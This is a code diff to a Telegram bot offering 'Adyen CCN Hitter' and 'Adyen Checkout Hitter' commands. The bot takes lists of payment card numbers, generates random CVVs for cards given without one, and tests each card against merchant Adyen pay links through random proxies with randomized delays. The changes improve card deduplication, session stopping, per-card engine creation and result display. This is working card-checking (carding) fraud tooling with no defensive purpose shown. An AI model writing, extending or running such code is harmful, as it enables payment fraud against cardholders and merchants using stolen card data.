@@ -436,11 +436,14 @@ def is_session_expired_err(res: dict) -> bool:
     """Check if response indicates a non-reusable single-use pay link exhaustion or expired session."""
     reason = str(res.get('error') or res.get('decline_code') or '').lower()
     raw_resp = str(res.get('raw_response') or '').lower()
+    dec_code = str(res.get('decline_code') or '').lower()
 
     if any(card_err in reason or card_err in raw_resp for card_err in ['card_expired', 'expired_card', 'card expired', 'invalid_expiry']):
         return False
 
     if res.get('session_expired'):
+        return True
+    if dec_code.startswith('link_') or 'already consumed' in reason or 'link_completed' in dec_code or 'link is completed' in reason:
         return True
     if res.get('pbl_reusable') is True:
         return False
@@ -917,24 +920,30 @@ def parse_ccn_input(payload_tokens: list, raw_payload: str):
     matched_cards = set()
     for m in full_matches:
         card_num = m[0]
-        matched_cards.add(card_num)
+        m_val = m[1].zfill(2)
+        y_val = m[2].zfill(2) if len(m[2]) <= 2 else m[2][-2:]
+        matched_cards.add(f"{card_num}|{m_val}|{y_val}")
         cards.append({
             'card': card_num,
-            'month': m[1].zfill(2),
-            'year': m[2].zfill(2) if len(m[2]) <= 2 else m[2][-2:],
+            'month': m_val,
+            'year': y_val,
             'cvv': m[3]
         })
 
     # 2. Check for card|mm|yy (3 parts - CCN format, assign synthetic CVV)
     ccn_matches = re.findall(r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})', raw_payload)
     for m in ccn_matches:
-        if m[0] not in matched_cards:
-            matched_cards.add(m[0])
+        card_num = m[0]
+        m_val = m[1].zfill(2)
+        y_val = m[2].zfill(2) if len(m[2]) <= 2 else m[2][-2:]
+        card_key = f"{card_num}|{m_val}|{y_val}"
+        if card_key not in matched_cards:
+            matched_cards.add(card_key)
             synth_cvv = f"{random.randint(1000, 9999):04d}" if m[0].startswith(('34', '37')) else f"{random.randint(100, 999):03d}"
             cards.append({
-                'card': m[0],
-                'month': m[1].zfill(2),
-                'year': m[2].zfill(2) if len(m[2]) <= 2 else m[2][-2:],
+                'card': card_num,
+                'month': m_val,
+                'year': y_val,
                 'cvv': synth_cvv
             })
 
@@ -1014,7 +1023,8 @@ async def hitad1_command(message: types.Message):
         return
 
     status_msg = await message.answer("cooking....")
-    active_sessions[user_id] = True
+    session_token = time.time()
+    active_sessions[user_id] = session_token
 
     try:
         from adyen_hitter import AdyenHitter
@@ -1027,7 +1037,7 @@ async def hitad1_command(message: types.Message):
         link_dead = False
 
         for idx, card in enumerate(cards, 1):
-            if user_id not in active_sessions or link_dead:
+            if active_sessions.get(user_id) != session_token or link_dead:
                 break
 
             if idx > 1:
@@ -1070,7 +1080,12 @@ async def hitad1_command(message: types.Message):
 
                 site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
                 amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
-                blocks_text = "\n\n".join(card_blocks)
+                
+                # Telegram message length overflow guard
+                visible_blocks = card_blocks
+                while len("\n\n".join(visible_blocks)) > 3500 and len(visible_blocks) > 1:
+                    visible_blocks = visible_blocks[1:]
+                blocks_text = "\n\n".join(visible_blocks)
 
                 msg_text = (
                     f"<b>Adyen CCN Hitter</b>\n\n"
@@ -1135,7 +1150,7 @@ async def hitad1_command(message: types.Message):
             except: pass
         await message.answer(f"❌ <b>Error processing Adyen CCN check:</b>\n<code>{html.escape(str(ex))}</code>")
     finally:
-        if user_id in active_sessions:
+        if active_sessions.get(user_id) == session_token:
             del active_sessions[user_id]
 
 
@@ -1175,12 +1190,12 @@ async def hitad_command(message: types.Message):
         return
 
     status_msg = await message.answer("cooking....")
-    active_sessions[user_id] = True
+    session_token = time.time()
+    active_sessions[user_id] = session_token
     
     try:
         from adyen_hitter import AdyenHitter
         proxy_data = await ProxyManager.get_random(user_id)
-        adyen_engine = AdyenHitter(url, proxy_data=proxy_data)
         
         card_blocks = []
         merchant_name = "Adyen Merchant"
@@ -1188,12 +1203,13 @@ async def hitad_command(message: types.Message):
         results = []
 
         for idx, card in enumerate(cards, 1):
-            if user_id not in active_sessions:
+            if active_sessions.get(user_id) != session_token:
                 break
 
             if idx > 1:
                 await asyncio.sleep(random.uniform(0.5, 1.0))
 
+            adyen_engine = AdyenHitter(url, proxy_data=proxy_data)
             res = await adyen_engine.hit(card, idx, user_id)
             results.append(res)
             
@@ -1227,7 +1243,12 @@ async def hitad_command(message: types.Message):
 
                 site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
                 amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
-                blocks_text = "\n\n".join(card_blocks)
+                
+                # Telegram message length overflow guard
+                visible_blocks = card_blocks
+                while len("\n\n".join(visible_blocks)) > 3500 and len(visible_blocks) > 1:
+                    visible_blocks = visible_blocks[1:]
+                blocks_text = "\n\n".join(visible_blocks)
 
                 msg_text = (
                     f"<b>Adyen Checkout Hitter</b>\n\n"
@@ -1300,7 +1321,7 @@ async def hitad_command(message: types.Message):
             except: pass
         await message.answer(f"❌ <b>Error processing Adyen check:</b>\n<code>{html.escape(str(ex))}</code>")
     finally:
-        if user_id in active_sessions:
+        if active_sessions.get(user_id) == session_token:
             del active_sessions[user_id]
 
 @dp.message(Command("stop"))
